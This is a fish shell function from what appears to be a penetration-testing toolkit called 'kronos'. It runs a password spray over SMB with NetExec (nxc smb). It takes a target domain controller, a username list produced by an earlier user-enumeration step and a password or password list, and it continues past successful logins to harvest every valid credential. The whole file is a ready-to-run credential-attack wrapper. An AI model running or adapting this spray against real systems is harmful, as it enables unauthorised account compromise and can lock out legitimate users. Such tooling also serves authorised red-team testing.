# description: Password spray using nxc smb
function __kronos_spray --description "Password spray using nxc smb"
    argparse h/help u/userlist= p/password= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos spray [TARGET] [OPTIONS]"
        echo ""
        echo "Password spray against a target using nxc smb."
        echo ""
        echo "Arguments:"
        echo "  TARGET              IP, hostname, or nameserver (falls back to \$TGT_DC_IP or \$TGT_DC)"
        echo ""
        echo "Options:"
        echo "  -u, --userlist FILE Path to username list (defaults to valid_users.txt)"
        echo "  -p, --password PASS Password or path to password list to spray"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"; set target $TGT; end
    
    if test -z "$target"
        echo "error: target is required" >&2
        return 1
    end

    set -l userlist "valid_users.txt"
    if set -q _flag_userlist
        set userlist $_flag_userlist
    end

    if not test -f "$userlist"
        echo "error: userlist not found at $userlist. run 'kronos userenum' first." >&2
        return 1
    end

    if not set -q _flag_password
        echo "error: password or password list (-p) is required" >&2
        return 1
    end

    set -l password $_flag_password

    if not command -v nxc >/dev/null
        echo "error: nxc not found. run 'kronos install'." >&2
        return 1
    end

    set -l nxc_cmd nxc smb $target -u $userlist -p $password --continue-on-success
    if test -n "$TGT_DC_DOMAIN"
        set -a nxc_cmd -d $TGT_DC_DOMAIN
    end

    echo "[*] Running password spray against $target..."
    command $nxc_cmd
end
